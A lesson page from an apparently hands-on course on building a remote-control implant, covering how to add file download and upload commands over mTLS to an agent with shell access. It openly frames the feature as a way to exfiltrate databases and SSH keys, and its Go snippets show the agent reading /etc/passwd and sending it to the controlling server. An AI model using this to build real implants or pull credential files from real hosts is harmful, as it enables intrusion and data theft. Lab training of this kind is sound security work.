# L19: File Transfer

## Mission

Transfer arbitrary bytes without base64 or command-output parsing.
You will download a guest file, upload a new one, then read the uploaded bytes
back through the shell handler.

L18 gives you remote shell execution.
But shell output is text.
You need to move binary files: exfiltrate a database, upload a tool, grab SSH
keys.
This exercise adds DOWNLOAD and UPLOAD commands using a size-then-bytes
protocol.

## What you will observe

A download announces its exact byte count before sending raw file data.
An upload consumes exactly its declared count from the existing buffered stream,
writes those bytes to disk, and leaves the following command intact.
Text commands and binary transfers continue to share one mTLS connection.

## Workspace

```text
exercises/L19-file-transfer
├── go.mod
└── main.go
```

Only `main.go` is editable.
The command loop already uses one `bufio.Reader`; both line parsing and upload
payload reads must continue through that same buffer.

## Size-then-bytes

The same pattern as HTTP Content-Length and SCP.
Before sending file data, send the size as a decimal number on its own line.
The receiver reads that line, parses the number, then reads exactly that many
bytes.

```text
  DOWNLOAD /etc/hostname
  ---
  Server reads:

  "7\n"               <- size line (decimal bytes, newline-terminated)
  "victim\n"          <- exactly 7 bytes of file data

  UPLOAD /tmp/payload 5
  ---
  Agent reads:

  Server sends 5 raw bytes after the command line.
  Agent writes them to /tmp/payload.
```

No base64, no encoding.
TLS handles framing and integrity. `io.LimitReader` prevents reading past the
boundary.

## DOWNLOAD

The server sends `DOWNLOAD <path>`.
The agent opens the file, gets its size with `os.Stat`, writes the size line,
then copies the file bytes.

```text
  Server                         Agent
    |                              |
    |--- "DOWNLOAD /etc/pass" --->|
    |                              |  f = os.Open("/etc/passwd")
    |                              |  info = f.Stat()
    |<-- "1247\n" ----------------|  size line
    |<-- [1247 bytes] ------------|  io.Copy(conn, f)
    |                              |
```

If the file does not exist, respond with `ERR` and no size line.

## UPLOAD

The server sends `UPLOAD <path> <size>`, then immediately sends the raw bytes.
The agent parses the path and size from the command, creates the file, and reads
exactly size bytes into it.

```text
  Server                         Agent
    |                              |
    |--- "UPLOAD /tmp/x 13\n" --->|
    |--- [13 bytes] ------------->|  io.Copy(f, io.LimitReader(conn, 13))
    |                              |  f.Close()
    |<-- "OK\n" -----------------|
    |                              |
```

`io.LimitReader(conn, size)` wraps the connection so that at most `size` bytes
are read.
This is critical: without it, the agent would consume the next command line as
file data.

## Implement it

Complete `main.go`:

- Everything from L18 (mTLS, dispatch, SHELL)
- `handleDownload`: os.Open, Stat for size, write size line, io.Copy
- `handleUpload`: parse path and size from arg, os.Create, io.Copy with
  LimitReader

### Interfaces used here

```go
import "io"

// DOWNLOAD: send file
f, err := os.Open(path)
info, err := f.Stat()
fmt.Fprintf(conn, "%d\n", info.Size())
io.Copy(conn, f)

// UPLOAD: receive file
r := io.LimitReader(conn, size)
f, err := os.Create(path)
io.Copy(f, r)
```

## Preserve buffered upload bytes

UPLOAD size is part of the command line, not a separate line. `UPLOAD /tmp/x 13`
means: path is `/tmp/x`, size is `13`.
Parse both from the arg string before reading bytes.
If you read a line to get the size, you have already consumed part of the file
data.

Also: `bufio.Scanner` buffers ahead.
After the scanner reads the UPLOAD command line, the file bytes are already in
the scanner's buffer, not in the raw connection.
You must read the file data from the scanner's underlying buffered reader, or
switch to `bufio.NewReader` for the connection and use `ReadString('\n')` for
command lines instead of a scanner.

## Test it

`rklings serve L19` starts this exercise's live transfer panel at
`http://127.0.0.1:8080`.
Sizes and downloaded bytes come from the guest agent.

```sh
./rklings serve L19
```

In another host terminal:

```sh
./rklings run L19
```

Open `http://127.0.0.1:8080`.
Use the download control with `/etc/hostname` and verify the returned byte count
and content.

For upload, choose a local file, set its guest destination to `/tmp/marker`, and
submit it.
Use the shell control to read the uploaded file back from the guest.

```
server> DOWNLOAD /etc/hostname
[received 7 bytes: "victim\n"]
server> UPLOAD /tmp/marker 11
[sent: "hello world"]
server> SHELL cat /tmp/marker
agent:  hello world
```

Stop `run` and `serve` with `Ctrl+C` when finished.

## Validate

```sh
./rklings validate L19
  [+] agent connects over mTLS
  [+] DOWNLOAD /etc/hostname returns correct contents
  [+] DOWNLOAD sends correct size header
  [+] UPLOAD writes file with correct contents
  [+] PING and SHELL still work
  PASS
```

## Next

The protocol now supports commands, execution, and file transfer.
M02 brings those operations together in the terminal and browser operator so you
can control a live target from one place.
